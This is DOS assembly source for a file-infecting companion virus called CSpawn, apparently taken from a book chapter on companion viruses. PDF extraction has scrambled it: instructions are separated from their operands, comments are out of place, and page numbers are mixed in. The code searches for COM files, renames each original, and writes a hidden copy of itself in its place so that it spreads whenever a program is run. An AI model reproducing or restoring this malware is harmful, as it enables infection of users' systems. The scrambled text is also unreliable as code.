
.model
.code
tiny
org 0100h mov
mov
mov
mov
shr
inc
int sp,OFFSET FINISH + 100H
ah,4AH
bx,sp
cl,4
bx,cl
bx
21H ;Change top of stack
;DOS resize memory fctn
mov
mov
mov
mov
mov
mov
mov bx,2CH
ax,[bx]
WORD PTR
ax,cs
WORD PTR
WORD PTR
WORD PTR ;set up EXEC param block
mov dx,OFFSET REAL_NAME
CSpawn:
;BX=# of para to keep
[PARAM_BLK],ax ;environment segment
[PARAM_BLK+4],ax
[PARAM_BLK+8],ax
[PARAM_BLK+12],ax ;@ of parameter string
;@ of FCB1
;@ of FCB2
;prep to EXECCompanion Viruses
mov
mov
int
cli
mov
mov
mov
mov
sti
push
mov
mov
bx,OFFSET PARAM_BLK
ax,4B00H
21H
47
;execute host
bx,ax
;save return code here
ax,cs
;AX holds code segment
ss,ax
;restore stack first
sp,(FINISH - CSpawn) + 200H
bx
ds,ax
es,ax
;Restore data segment
;Restore extra segment
mov
mov
int
call ah,1AH
dx,80H
21H
FIND_FILES ;DOS set DTA function
;put DTA at offset 80H
pop
mov
int ax
ah,4CH
21H ;AL holds return value
;DOS terminate function
;bye-bye
;Find and infect files
;The following routine searches for COM files and infects them
FIND_FILES:
mov
dx,OFFSET COM_MASK
;search for COM files
mov
ah,4EH
;DOS find first file function
xor
cx,cx
;CX holds all file attributes
FIND_LOOP:
int
21H
jc
FIND_DONE
;Exit if no files found
call
INFECT_FILE
;Infect the file!
mov
ah,4FH
;DOS find next file function
jmp
FIND_LOOP
;Try finding another file
FIND_DONE:
ret
;Return to caller
COM_MASK
db
’*.COM’,0
;COM file search mask
;This routine infects the file specified in the DTA.
INFECT_FILE:
mov
si,9EH
;DTA + 1EH
mov
di,OFFSET REAL_NAME
;DI points to new name
INF_LOOP:
lodsb
;Load a character
stosb
;and save it in buffer
or
al,al
;Is it a NULL?
jnz
INF_LOOP
;If so then leave the loop
mov
WORD PTR [di-2],’N’
;change name to CON & add 0
mov
dx,9EH
;DTA + 1EH
mov
di,OFFSET REAL_NAME
mov
ah,56H
;rename original file
int
21H
jc
INF_EXIT
;if can’t rename, already done
mov
mov
int ah,3CH
cx,2
21H ;DOS create file function
;set hidden attribute
mov
mov
mov
mov
int bx,ax
ah,40H
cx,FINISH - CSpawn
dx,OFFSET CSpawn
21H ;BX holds file handle
;DOS write to file function
;CX holds virus length
;DX points to CSpawn of virus
ah,3EH
21H ;DOS close file function
INF_EXIT: mov
int
ret REAL_NAME db 13 dup (?) ;Name of host to execute48
;DOS EXEC function parameter block
PARAM_BLK
DW
?
DD
80H
DD
5CH
DD
6CH
FINISH:
end
;environment segment
;@ of command line
;@ of first FCB
;@ of second FCB
CSpawn
